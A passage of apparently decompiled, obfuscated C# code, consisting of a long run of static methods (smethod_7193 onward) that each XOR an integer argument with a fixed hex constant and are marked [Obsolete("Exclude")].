	public static int smethod_7193(int int_4)
	{
		return int_4 ^ 0x6DA2F5BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7194(int int_4)
	{
		return int_4 ^ 0x60A29AB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7195(int int_4)
	{
		return int_4 ^ 0x5DB3629F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7196(int int_4)
	{
		return int_4 ^ 0x7F6F2D11;
	}

	[Obsolete("Exclude")]
	public static int smethod_7197(int int_4)
	{
		return int_4 ^ 0x5568A4E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7198(int int_4)
	{
		return int_4 ^ 0x14544F2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7201(int int_4)
	{
		return int_4 ^ 0x2E386C44;
	}

	[Obsolete("Exclude")]
	public static int smethod_7202(int int_4)
	{
		return int_4 ^ 0x438D5D07;
	}

	[Obsolete("Exclude")]
	public static int smethod_7203(int int_4)
	{
		return int_4 ^ 0x70BE66C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7204(int int_4)
	{
		return int_4 ^ 0x5A385EF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7205(int int_4)
	{
		return int_4 ^ 0x67FD340D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7206(int int_4)
	{
		return int_4 ^ 0x7C41CBC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7207(int int_4)
	{
		return int_4 ^ 0x525E87DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7208(int int_4)
	{
		return int_4 ^ 0x21232602;
	}

	[Obsolete("Exclude")]
	public static int smethod_7209(int int_4)
	{
		return int_4 ^ 0x1BFFDC48;
	}

	[Obsolete("Exclude")]
	public static int smethod_7210(int int_4)
	{
		return int_4 ^ 0x7784DBAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7211(int int_4)
	{
		return int_4 ^ 0x687F7978;
	}

	[Obsolete("Exclude")]
	public static int smethod_7212(int int_4)
	{
		return int_4 ^ 0xB964996;
	}

	[Obsolete("Exclude")]
	public static int smethod_7213(int int_4)
	{
		return int_4 ^ 0x1B85D691;
	}

	[Obsolete("Exclude")]
	public static int smethod_7214(int int_4)
	{
		return int_4 ^ 0x2DCC063;
	}

	[Obsolete("Exclude")]
	public static int smethod_7215(int int_4)
	{
		return int_4 ^ 0x4A8380C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7216(int int_4)
	{
		return int_4 ^ 0x77445024;
	}

	[Obsolete("Exclude")]
	public static int smethod_7217(int int_4)
	{
		return int_4 ^ 0x50AACD1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7218(int int_4)
	{
		return int_4 ^ 0x3AA9665C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7219(int int_4)
	{
		return int_4 ^ 0x58862E35;
	}

	[Obsolete("Exclude")]
	public static int smethod_7220(int int_4)
	{
		return int_4 ^ 0x3C18E600;
	}

	[Obsolete("Exclude")]
	public static int smethod_7222(int int_4)
	{
		return int_4 ^ 0xB482DB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7223(int int_4)
	{
		return int_4 ^ 0x147CBBA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7224(int int_4)
	{
		return int_4 ^ 0x707E2A6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7226(int int_4)
	{
		return int_4 ^ 0x18302C0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7227(int int_4)
	{
		return int_4 ^ 0x6A2AEC6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7228(int int_4)
	{
		return int_4 ^ 0x9D04529;
	}

	[Obsolete("Exclude")]
	public static int smethod_7229(int int_4)
	{
		return int_4 ^ 0x5ED2C0EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7230(int int_4)
	{
		return int_4 ^ 0x21BAC833;
	}

	[Obsolete("Exclude")]
	public static int smethod_7231(int int_4)
	{
		return int_4 ^ 0x39C5327;
	}

	[Obsolete("Exclude")]
	public static int smethod_7232(int int_4)
	{
		return int_4 ^ 0x1AE646CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7233(int int_4)
	{
		return int_4 ^ 0x7E09C424;
	}

	[Obsolete("Exclude")]
	public static int smethod_7235(int int_4)
	{
		return int_4 ^ 0x456E73F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7236(int int_4)
	{
		return int_4 ^ 0x512B825E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7237(int int_4)
	{
		return int_4 ^ 0x3904A2F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7238(int int_4)
	{
		return int_4 ^ 0x3158A561;
	}

	[Obsolete("Exclude")]
	public static int smethod_7239(int int_4)
	{
		return int_4 ^ 0x6476AEF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7240(int int_4)
	{
		return int_4 ^ 0xD1948D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7241(int int_4)
	{
		return int_4 ^ 0x63C853D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7242(int int_4)
	{
		return int_4 ^ 0x3C843AF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7243(int int_4)
	{
		return int_4 ^ 0x15AA41E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7244(int int_4)
	{
		return int_4 ^ 0x1ABA02AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7245(int int_4)
	{
		return int_4 ^ 0x70D3659E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7246(int int_4)
	{
		return int_4 ^ 0x29048FFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7247(int int_4)
	{
		return int_4 ^ 0x4F312628;
	}

	[Obsolete("Exclude")]
	public static int smethod_7248(int int_4)
	{
		return int_4 ^ 0xA130B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7249(int int_4)
	{
		return int_4 ^ 0x79D81FAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7251(int int_4)
	{
		return int_4 ^ 0x51AAB018;
	}

	[Obsolete("Exclude")]
	public static int smethod_7252(int int_4)
	{
		return int_4 ^ 0x77B1E162;
	}

	[Obsolete("Exclude")]
	public static int smethod_7253(int int_4)
	{
		return int_4 ^ 0xD7193CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7254(int int_4)
	{
		return int_4 ^ 0x52D40EFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7255(int int_4)
	{
		return int_4 ^ 0x35C117FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7256(int int_4)
	{
		return int_4 ^ 0x299D4253;
	}

	[Obsolete("Exclude")]
	public static int smethod_7257(int int_4)
	{
		return int_4 ^ 0x3433982;
	}

	[Obsolete("Exclude")]
	public static int smethod_7258(int int_4)
	{
		return int_4 ^ 0x2C128A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7259(int int_4)
	{
		return int_4 ^ 0x4ADA404B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7260(int int_4)
	{
		return int_4 ^ 0x1526832B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7261(int int_4)
	{
		return int_4 ^ 0x13D91BAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7262(int int_4)
	{
		return int_4 ^ 0x7AEC1A64;
	}

	[Obsolete("Exclude")]
	public static int smethod_7263(int int_4)
	{
		return int_4 ^ 0x7138BABA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7264(int int_4)
	{
		return int_4 ^ 0x20339AFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7266(int int_4)
	{
		return int_4 ^ 0x634DE52B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7267(int int_4)
	{
		return int_4 ^ 0x66E5028;
	}

	[Obsolete("Exclude")]
	public static int smethod_7268(int int_4)
	{
		return int_4 ^ 0x1CCEA7C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7269(int int_4)
	{
		return int_4 ^ 0x6C7F833A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7270(int int_4)
	{
		return int_4 ^ 0x1A496457;
	}

	[Obsolete("Exclude")]
	public static int smethod_7271(int int_4)
	{
		return int_4 ^ 0x53508DF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7272(int int_4)
	{
		return int_4 ^ 0x7BA9D60F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7274(int int_4)
	{
		return int_4 ^ 0x634EE56C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7277(int int_4)
	{
		return int_4 ^ 0x3219108C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7278(int int_4)
	{
		return int_4 ^ 0x495D17BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7280(int int_4)
	{
		return int_4 ^ 0x6543D27D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7281(int int_4)
	{
		return int_4 ^ 0x6029CA52;
	}

	[Obsolete("Exclude")]
	public static int smethod_7284(int int_4)
	{
		return int_4 ^ 0x9816E68;
	}

	[Obsolete("Exclude")]
	public static int smethod_7285(int int_4)
	{
		return int_4 ^ 0x24610F37;
	}

	[Obsolete("Exclude")]
	public static int smethod_7286(int int_4)
	{
		return int_4 ^ 0x191ACF7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7287(int int_4)
	{
		return int_4 ^ 0x21192725;
	}

	[Obsolete("Exclude")]
	public static int smethod_7289(int int_4)
	{
		return int_4 ^ 0x2EB6D3AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7290(int int_4)
	{
		return int_4 ^ 0x1FE9F4BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7291(int int_4)
	{
		return int_4 ^ 0x2D2CF147;
	}

	[Obsolete("Exclude")]
	public static int smethod_7292(int int_4)
	{
		return int_4 ^ 0x1BD0D795;
	}

	[Obsolete("Exclude")]
	public static int smethod_7293(int int_4)
	{
		return int_4 ^ 0x98C18FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7294(int int_4)
	{
		return int_4 ^ 0x2284517E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7295(int int_4)
	{
		return int_4 ^ 0x6501C405;
	}

	[Obsolete("Exclude")]
	public static int smethod_7296(int int_4)
	{
		return int_4 ^ 0x5D6701C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7297(int int_4)
	{
		return int_4 ^ 0x728B0A58;
	}

	[Obsolete("Exclude")]
	public static int smethod_7298(int int_4)
	{
		return int_4 ^ 0x36874CBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7299(int int_4)
	{
		return int_4 ^ 0x52CCB9F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7301(int int_4)
	{
		return int_4 ^ 0x738979A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7302(int int_4)
	{
		return int_4 ^ 0x1ACCF8AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7303(int int_4)
	{
		return int_4 ^ 0x353356D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7305(int int_4)
	{
		return int_4 ^ 0x2ABEC3A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7306(int int_4)
	{
		return int_4 ^ 0x3C483088;
	}

	[Obsolete("Exclude")]
	public static int smethod_7307(int int_4)
	{
		return int_4 ^ 0x3FDD737C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7308(int int_4)
	{
		return int_4 ^ 0x71E7D139;
	}

	[Obsolete("Exclude")]
	public static int smethod_7310(int int_4)
	{
		return int_4 ^ 0x44BCCD90;
	}

	[Obsolete("Exclude")]
	public static int smethod_7311(int int_4)
	{
		return int_4 ^ 0x367A6F8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7314(int int_4)
	{
		return int_4 ^ 0x631F27EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7315(int int_4)
	{
		return int_4 ^ 0x79BB693B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7316(int int_4)
	{
		return int_4 ^ 0x723067E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7317(int int_4)
	{
		return int_4 ^ 0x74BB102D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7318(int int_4)
	{
		return int_4 ^ 0x5B560494;
	}

	[Obsolete("Exclude")]
	public static int smethod_7320(int int_4)
	{
		return int_4 ^ 0x67D4750A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7321(int int_4)
	{
		return int_4 ^ 0xCCFB5BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7322(int int_4)
	{
		return int_4 ^ 0x393011B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7323(int int_4)
	{
		return int_4 ^ 0x5E40A2AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7324(int int_4)
	{
		return int_4 ^ 0x7B14585C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7325(int int_4)
	{
		return int_4 ^ 0x4E094D34;
	}

	[Obsolete("Exclude")]
	public static int smethod_7326(int int_4)
	{
		return int_4 ^ 0x2C277630;
	}

	[Obsolete("Exclude")]
	public static int smethod_7327(int int_4)
	{
		return int_4 ^ 0x932C1FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7328(int int_4)
	{
		return int_4 ^ 0x5498D181;
	}

	[Obsolete("Exclude")]
	public static int smethod_7329(int int_4)
	{
		return int_4 ^ 0x7B4EFB9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7330(int int_4)
	{
		return int_4 ^ 0x60A2970F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7333(int int_4)
	{
		return int_4 ^ 0x252557DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7334(int int_4)
	{
		return int_4 ^ 0x125D2123;
	}

	[Obsolete("Exclude")]
	public static int smethod_7335(int int_4)
	{
		return int_4 ^ 0x15CA48E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7338(int int_4)
	{
		return int_4 ^ 0x4CDB0269;
	}

	[Obsolete("Exclude")]
	public static int smethod_7339(int int_4)
	{
		return int_4 ^ 0x626BCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7342(int int_4)
	{
		return int_4 ^ 0x5FC1FF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7343(int int_4)
	{
		return int_4 ^ 0xA93D040;
	}

	[Obsolete("Exclude")]
	public static int smethod_7344(int int_4)
	{
		return int_4 ^ 0x60D3A77;
	}

	[Obsolete("Exclude")]
	public static int smethod_7345(int int_4)
	{
		return int_4 ^ 0x3E44B3CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7346(int int_4)
	{
		return int_4 ^ 0xC7DA00;
	}

	[Obsolete("Exclude")]
	public static int smethod_7347(int int_4)
	{
		return int_4 ^ 0x204ED385;
	}

	[Obsolete("Exclude")]
	public static int smethod_7348(int int_4)
	{
		return int_4 ^ 0x7C76A52B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7350(int int_4)
	{
		return int_4 ^ 0x44F7583F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7351(int int_4)
	{
		return int_4 ^ 0x3F9817B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7354(int int_4)
	{
		return int_4 ^ 0x34B6A282;
	}

	[Obsolete("Exclude")]
	public static int smethod_7357(int int_4)
	{
		return int_4 ^ 0x353F52D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7358(int int_4)
	{
		return int_4 ^ 0x6110970;
	}

	[Obsolete("Exclude")]
	public static int smethod_7359(int int_4)
	{
		return int_4 ^ 0x13572A96;
	}

	[Obsolete("Exclude")]
	public static int smethod_7360(int int_4)
	{
		return int_4 ^ 0x26EDCA2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7361(int int_4)
	{
		return int_4 ^ 0x4F92E926;
	}

	[Obsolete("Exclude")]
	public static int smethod_7362(int int_4)
	{
		return int_4 ^ 0x1CC532D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7363(int int_4)
	{
		return int_4 ^ 0x65A28223;
	}

	[Obsolete("Exclude")]
	public static int smethod_7364(int int_4)
	{
		return int_4 ^ 0x6CB127B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7365(int int_4)
	{
		return int_4 ^ 0x2D03C5C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7366(int int_4)
	{
		return int_4 ^ 0x2DFEA523;
	}

	[Obsolete("Exclude")]
	public static int smethod_7367(int int_4)
	{
		return int_4 ^ 0x7CC7DB22;
	}

	[Obsolete("Exclude")]
	public static int smethod_7369(int int_4)
	{
		return int_4 ^ 0x5D1D530C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7372(int int_4)
	{
		return int_4 ^ 0xDE2A92C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7373(int int_4)
	{
		return int_4 ^ 0x3BE34A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7376(int int_4)
	{
		return int_4 ^ 0x39CA4BC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7377(int int_4)
	{
		return int_4 ^ 0x5CC92100;
	}

	[Obsolete("Exclude")]
	public static int smethod_7378(int int_4)
	{
		return int_4 ^ 0x4DADF74E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7381(int int_4)
	{
		return int_4 ^ 0xB0FD14C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7382(int int_4)
	{
		return int_4 ^ 0x499C330D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7384(int int_4)
	{
		return int_4 ^ 0x2E3A3912;
	}

	[Obsolete("Exclude")]
	public static int smethod_7386(int int_4)
	{
		return int_4 ^ 0x1D2CC493;
	}

	[Obsolete("Exclude")]
	public static int smethod_7387(int int_4)
	{
		return int_4 ^ 0x50B71B0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7389(int int_4)
	{
		return int_4 ^ 0x173667CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7391(int int_4)
	{
		return int_4 ^ 0x1BAB0143;
	}

	[Obsolete("Exclude")]
	public static int smethod_7392(int int_4)
	{
		return int_4 ^ 0x51912F8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7393(int int_4)
	{
		return int_4 ^ 0x37002C68;
	}

	[Obsolete("Exclude")]
	public static int smethod_7394(int int_4)
	{
		return int_4 ^ 0x4D51CBE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7396(int int_4)
	{
		return int_4 ^ 0x5DD20804;
	}

	[Obsolete("Exclude")]
	public static int smethod_7397(int int_4)
	{
		return int_4 ^ 0x7D9FCED5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7398(int int_4)
	{
		return int_4 ^ 0x714540FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7400(int int_4)
	{
		return int_4 ^ 0x797E889E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7401(int int_4)
	{
		return int_4 ^ 0x73F76EF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7402(int int_4)
	{
		return int_4 ^ 0x32D68743;
	}

	[Obsolete("Exclude")]
	public static int smethod_7403(int int_4)
	{
		return int_4 ^ 0x7CF9D3C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7404(int int_4)
	{
		return int_4 ^ 0x77B54E53;
	}

	[Obsolete("Exclude")]
	public static int smethod_7405(int int_4)
	{
		return int_4 ^ 0x6EA5FD37;
	}

	[Obsolete("Exclude")]
	public static int smethod_7407(int int_4)
	{
		return int_4 ^ 0x1FC56F96;
	}

	[Obsolete("Exclude")]
	public static int smethod_7408(int int_4)
	{
		return int_4 ^ 0x35D65A05;
	}

	[Obsolete("Exclude")]
	public static int smethod_7409(int int_4)
	{
		return int_4 ^ 0x346E48D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7410(int int_4)
	{
		return int_4 ^ 0x1EED02C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7413(int int_4)
	{
		return int_4 ^ 0x64924A74;
	}

	[Obsolete("Exclude")]
	public static int smethod_7415(int int_4)
	{
		return int_4 ^ 0x6821B7A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7418(int int_4)
	{
		return int_4 ^ 0x105DF0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7419(int int_4)
	{
		return int_4 ^ 0x5C2C8BC1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7420(int int_4)
	{
		return int_4 ^ 0x7A49850E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7421(int int_4)
	{
		return int_4 ^ 0x17AE56F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7422(int int_4)
	{
		return int_4 ^ 0x3C51904B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7423(int int_4)
	{
		return int_4 ^ 0x729B6BC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7429(int int_4)
	{
		return int_4 ^ 0x9D46472;
	}

	[Obsolete("Exclude")]
	public static int smethod_7430(int int_4)
	{
		return int_4 ^ 0x2B79C337;
	}

	[Obsolete("Exclude")]
	public static int smethod_7431(int int_4)
	{
		return int_4 ^ 0x238057DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7432(int int_4)
	{
		return int_4 ^ 0x1D0149D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7434(int int_4)
	{
		return int_4 ^ 0x2B18329B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7435(int int_4)
	{
		return int_4 ^ 0x5B1D3740;
	}

	[Obsolete("Exclude")]
	public static int smethod_7436(int int_4)
	{
		return int_4 ^ 0x36FDF778;
	}

	[Obsolete("Exclude")]
	public static int smethod_7437(int int_4)
	{
		return int_4 ^ 0x2C1267F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7438(int int_4)
	{
		return int_4 ^ 0x31F1EC4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7439(int int_4)
	{
		return int_4 ^ 0x629DC12;
	}

	[Obsolete("Exclude")]
	public static int smethod_7440(int int_4)
	{
		return int_4 ^ 0x76D6C1A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7441(int int_4)
	{
		return int_4 ^ 0x44F51667;
	}

	[Obsolete("Exclude")]
	public static int smethod_7443(int int_4)
	{
		return int_4 ^ 0x1E2B4CD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7444(int int_4)
	{
		return int_4 ^ 0x4548FD96;
	}

	[Obsolete("Exclude")]
	public static int smethod_7445(int int_4)
	{
		return int_4 ^ 0x21EA7381;
	}

	[Obsolete("Exclude")]
	public static int smethod_7446(int int_4)
	{
		return int_4 ^ 0xE47085B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7448(int int_4)
	{
		return int_4 ^ 0x26F9FFA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7449(int int_4)
	{
		return int_4 ^ 0x23E8F474;
	}

	[Obsolete("Exclude")]
	public static int smethod_7450(int int_4)
	{
		return int_4 ^ 0x4119669A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7451(int int_4)
	{
		return int_4 ^ 0x2190F71E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7452(int int_4)
	{
		return int_4 ^ 0x3597E491;
	}

	[Obsolete("Exclude")]
	public static int smethod_7453(int int_4)
	{
		return int_4 ^ 0x694896F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7454(int int_4)
	{
		return int_4 ^ 0x77230AA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7457(int int_4)
	{
		return int_4 ^ 0x32E90F72;
	}

	[Obsolete("Exclude")]
	public static int smethod_7458(int int_4)
	{
		return int_4 ^ 0x2B43BFD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7460(int int_4)
	{
		return int_4 ^ 0x5D7E5381;
	}

	[Obsolete("Exclude")]
	public static int smethod_7461(int int_4)
	{
		return int_4 ^ 0x77A8BCF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7462(int int_4)
	{
		return int_4 ^ 0x5C433B19;
	}

	[Obsolete("Exclude")]
	public static int smethod_7463(int int_4)
	{
		return int_4 ^ 0x2D09E629;
	}

	[Obsolete("Exclude")]
	public static int smethod_7464(int int_4)
	{
		return int_4 ^ 0x29D83964;
	}

	[Obsolete("Exclude")]
	public static int smethod_7466(int int_4)
	{
		return int_4 ^ 0x75426977;
	}

	[Obsolete("Exclude")]
	public static int smethod_7467(int int_4)
	{
		return int_4 ^ 0x9CB84D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7469(int int_4)
	{
		return int_4 ^ 0x4A217707;
	}

	[Obsolete("Exclude")]
	public static int smethod_7470(int int_4)
	{
		return int_4 ^ 0x6A407E23;
	}

	[Obsolete("Exclude")]
	public static int smethod_7471(int int_4)
	{
		return int_4 ^ 0x7D0DEA24;
	}

	[Obsolete("Exclude")]
	public static int smethod_7472(int int_4)
	{
		return int_4 ^ 0x3A78BAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7474(int int_4)
	{
		return int_4 ^ 0x4BE03F86;
	}

	[Obsolete("Exclude")]
	public static int smethod_7475(int int_4)
	{
		return int_4 ^ 0x7969F6BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7476(int int_4)
	{
		return int_4 ^ 0x32E6C1D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7477(int int_4)
	{
		return int_4 ^ 0x396C3EDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7478(int int_4)
	{
		return int_4 ^ 0x3AB956E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7479(int int_4)
	{
		return int_4 ^ 0x56CE430F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7480(int int_4)
	{
		return int_4 ^ 0x23D123E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7481(int int_4)
	{
		return int_4 ^ 0x71D9EDDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7482(int int_4)
	{
		return int_4 ^ 0x4737291D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7486(int int_4)
	{
		return int_4 ^ 0x484729D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7487(int int_4)
	{
		return int_4 ^ 0x2D2E130;
	}

	[Obsolete("Exclude")]
	public static int smethod_7490(int int_4)
	{
		return int_4 ^ 0x6B710D30;
	}

	[Obsolete("Exclude")]
	public static int smethod_7491(int int_4)
	{
		return int_4 ^ 0x46536906;
	}

	[Obsolete("Exclude")]
	public static int smethod_7492(int int_4)
	{
		return int_4 ^ 0x7C7D1A6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7493(int int_4)
	{
		return int_4 ^ 0x5E769806;
	}

	[Obsolete("Exclude")]
	public static int smethod_7495(int int_4)
	{
		return int_4 ^ 0x17CAED14;
	}

	[Obsolete("Exclude")]
	public static int smethod_7496(int int_4)
	{
		return int_4 ^ 0x73BD4068;
	}

	[Obsolete("Exclude")]
	public static int smethod_7497(int int_4)
	{
		return int_4 ^ 0x311CF2C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7498(int int_4)
	{
		return int_4 ^ 0x71B6ABBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7499(int int_4)
	{
		return int_4 ^ 0x18305A11;
	}

	[Obsolete("Exclude")]
	public static int smethod_7500(int int_4)
	{
		return int_4 ^ 0x7C00E93;
	}

	[Obsolete("Exclude")]
	public static int smethod_7501(int int_4)
	{
		return int_4 ^ 0x2D4CEB1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7502(int int_4)
	{
		return int_4 ^ 0x1A6865;
	}

	[Obsolete("Exclude")]
	public static int smethod_7504(int int_4)
	{
		return int_4 ^ 0x565071AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7506(int int_4)
	{
		return int_4 ^ 0x33E1DCBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7511(int int_4)
	{
		return int_4 ^ 0x3722ABCE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7512(int int_4)
	{
		return int_4 ^ 0x5B15B376;
	}

	[Obsolete("Exclude")]
	public static int smethod_7513(int int_4)
	{
		return int_4 ^ 0x2FEC8B07;
	}

	[Obsolete("Exclude")]
	public static int smethod_7514(int int_4)
	{
		return int_4 ^ 0x300BCFEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7515(int int_4)
	{
		return int_4 ^ 0x2E9955F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7516(int int_4)
	{
		return int_4 ^ 0x1D479624;
	}

	[Obsolete("Exclude")]
	public static int smethod_7517(int int_4)
	{
		return int_4 ^ 0x5B746652;
	}

	[Obsolete("Exclude")]
	public static int smethod_7521(int int_4)
	{
		return int_4 ^ 0x1E83065D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7522(int int_4)
	{
		return int_4 ^ 0x62F62677;
	}

	[Obsolete("Exclude")]
	public static int smethod_7523(int int_4)
	{
		return int_4 ^ 0x24575145;
	}

	[Obsolete("Exclude")]
	public static int smethod_7524(int int_4)
	{
		return int_4 ^ 0x1AB99F0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7525(int int_4)
	{
		return int_4 ^ 0x50E40B71;
	}

	[Obsolete("Exclude")]
	public static int smethod_7526(int int_4)
	{
		return int_4 ^ 0x1B0EC86B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7527(int int_4)
	{
		return int_4 ^ 0x50D2B178;
	}

	[Obsolete("Exclude")]
	public static int smethod_7528(int int_4)
	{
		return int_4 ^ 0x49F04201;
	}

	[Obsolete("Exclude")]
	public static int smethod_7529(int int_4)
	{
		return int_4 ^ 0x55C88ED1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7530(int int_4)
	{
		return int_4 ^ 0x3EB79A02;
	}

	[Obsolete("Exclude")]
	public static int smethod_7531(int int_4)
	{
		return int_4 ^ 0x27EA61FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7533(int int_4)
	{
		return int_4 ^ 0x17A6313A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7534(int int_4)
	{
